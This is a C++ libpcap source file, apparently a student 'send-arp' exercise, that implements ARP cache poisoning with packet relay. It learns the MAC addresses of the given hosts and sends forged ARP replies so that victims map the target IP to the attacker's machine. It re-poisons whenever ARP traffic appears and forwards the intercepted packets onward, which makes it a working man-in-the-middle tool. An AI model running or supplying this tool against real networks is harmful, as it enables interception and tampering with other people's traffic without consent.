#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthIpPacket {
	EthHdr eth_;
	char none[12];
	Ip s_ip;
	Ip d_ip;
};
#pragma pack(pop)


void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
int store_size = 0;
char ** store_mac;
char ** store_ip;
char ** sender_ips;
char ** target_ips;

int GetInterfaceMacAddress(char * ,char * );
int GetInterfaceIP(char *,char * );
void GetMACaddr(pcap_t*,char *,char *,char * ,char * );
void send_packet(pcap_t* ,char *,char * ,char *,char *);
int find_index_ip(char * );
void checking_packet(pcap_t*,char *,char *,int );
int GetInterfaceMacAddress(char * ifname,char * MAC_Address){
	uint8_t *mac = (uint8_t *)malloc(sizeof(uint8_t) * 30);
	struct ifreq ifr;
	int sockfd, ret;
	sockfd = socket(AF_INET,SOCK_DGRAM,0);
	if(sockfd < 0){
		printf("Fail to get interface MAC address - socket() failed\n");
		return -1;
	}
	strncpy(ifr.ifr_name,ifname,IFNAMSIZ);
	ret = ioctl(sockfd , SIOCGIFHWADDR,&ifr);
	if (ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed \n");
		close(sockfd);
		return -1;
	}
	memcpy(mac,ifr.ifr_hwaddr.sa_data,6);
	close(sockfd);	
	sprintf(MAC_Address,"%02X:%02X:%02X:%02X:%02X:%02X",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	free(mac);
}

int GetInterfaceIP(char *ifname,char * ip){
	struct ifreq ifr;
	int s;
	s = socket(AF_INET,SOCK_DGRAM,0);
	strncpy(ifr.ifr_name,ifname,IFNAMSIZ);

	if(ioctl(s,SIOCGIFADDR,&ifr) < 0){
		printf("ERROR");
		return -1;
	}
	inet_ntop(AF_INET,ifr.ifr_addr.sa_data + 2,ip,sizeof(struct sockaddr));
}

void GetMACaddr(pcap_t* handle,char * sender_ip,char *my_mac_addr,char * my_ip,char * sender_mac_addr){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(my_mac_addr);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac_addr);
	packet.arp_.sip_ = htonl(Ip(my_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(sender_ip));
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	while(1){
		struct pcap_pkthdr* header;
        EthArpPacket *packet1;
        int res = pcap_next_ex(handle, &header,(const u_char **) &packet1);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
			if((packet1->eth_.type_!= htons(EthHdr::Arp)))  {
			continue;
		}
		sprintf(sender_mac_addr,"%02X:%02X:%02X:%02X:%02X:%02X",packet1->eth_.smac_[0],packet1->eth_.smac_[1],packet1->eth_.smac_[2],packet1->eth_.smac_[3],packet1->eth_.smac_[4],packet1->eth_.smac_[5]);
		
		break;
	}
	return ;
}
int find_index_ip(char * find_ip){
	for(int i=0;i<20;i++){
		if(*(store_ip+i) == NULL){
			return -1;
		}
		if(!strcmp(*(store_ip+i),find_ip)){
			return i;
		}
	}
	return -2;
}

void send_packet(pcap_t* handle,char * sender_ip,char * target_ip,char *my_mac_addr,char * my_ip){
	int index = find_index_ip(sender_ip);
	char * sender_mac_addr = *(store_mac+index);
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac_addr);
	packet.eth_.smac_ = Mac(my_mac_addr);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_mac_addr);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac_addr);
	packet.arp_.tip_ = htonl(Ip(sender_ip));
	for(int i=0;i<3;i++){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}}
}
void checking_packet(pcap_t* handle,char *my_mac_addr,char *my_ip,int count){
	while(1){
		int cont_flag = 0;
		struct pcap_pkthdr* header;
        char *packet;
        int res = pcap_next_ex(handle, &header,(const u_char **) &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
		EthArpPacket *packet1 = (EthArpPacket *) packet;
		EthHdr *packet2 = (EthHdr *)packet;
		if((packet1->eth_.type_== htons(EthHdr::Arp))){
			for(int i=0;i<count;i++){
				if(packet1->arp_.sip_ == (Ip)htonl(Ip(target_ips[i]))
				|| packet1->arp_.sip_ == (Ip)htonl(Ip(sender_ips[i]))) {
					send_packet(handle,sender_ips[i],target_ips[i],my_mac_addr,my_ip);
					cont_flag = 1;
					break;
				}

			}
			if(cont_flag)
				continue;

		}
		else{
			for(int i=0;i<count;i++){			
				if((((EthIpPacket *)packet)->eth_.smac_ == Mac(store_mac[find_index_ip(sender_ips[i])])) &&(((EthIpPacket *)packet)->eth_.dmac_ == Mac(my_mac_addr)) && 
				(((EthIpPacket *)packet)->s_ip == (Ip)htonl(Ip(sender_ips[i]))) ){
					u_char * relay_packet = (u_char  *)malloc(header->caplen);
					memcpy(relay_packet,packet,header->caplen);
					((EthHdr *)relay_packet)-> smac_ = Mac(my_mac_addr);
					((EthHdr *)relay_packet)-> dmac_ = Mac(store_mac[find_index_ip(target_ips[i])]);
					int res = pcap_sendpacket(handle, relay_packet,header->caplen);
					printf("send sender's packet\n"); 
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
							}
					free(relay_packet);
				}
				break;
			}

		}
	}
}
int main(int argc, char* argv[]) {
	if (argc % 2 | argc < 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char *attacker_mac_addr = (char *)malloc(sizeof(uint8_t) * 20);
	char *attacker_ip = (char *)malloc(sizeof(uint8_t) * 20);
	GetInterfaceMacAddress(argv[1],attacker_mac_addr);
	GetInterfaceIP(argv[1],attacker_ip);

// get MAC_address
	store_mac = (char **)malloc(sizeof(uint64_t) * 20);
	store_ip = (char **)malloc(sizeof(uint64_t) * 20);
	int index = -1;


	int cnt = (argc - 2) / 2;
	target_ips = (char **)malloc(sizeof(uint64_t) * (cnt + 2));
	sender_ips = (char **)malloc(sizeof(uint64_t) * (cnt + 2));

	for(int i=1;i<=cnt;i++){
		*(sender_ips + (i-1)) = argv[2*i];
		*(target_ips + (i-1)) = argv[2*i + 1];
	}
	for(int i=0;i<argc-2;i++){
		index = find_index_ip(argv[i+2]);
		if(index >=0)
			continue;
		if(index == -2){
			printf("STORE DATA ERROR. TOO MANY IPs!");
			return -1;
		}
		char * sender_mac_addr = (char *)malloc(sizeof(uint8_t)*20);
		GetMACaddr(handle,argv[i+2],attacker_mac_addr,attacker_ip,sender_mac_addr);
		*(store_mac + store_size) =sender_mac_addr;
		*(store_ip + store_size) = argv[i+2];
		store_size ++;
	}
	//arp_table_change

	for(int i=0;i<cnt;i++){
		send_packet(handle,*(sender_ips+i),*(target_ips+i),attacker_mac_addr,attacker_ip);
	}
	
	checking_packet(handle,attacker_mac_addr,attacker_ip,cnt);
	pcap_close(handle);
}
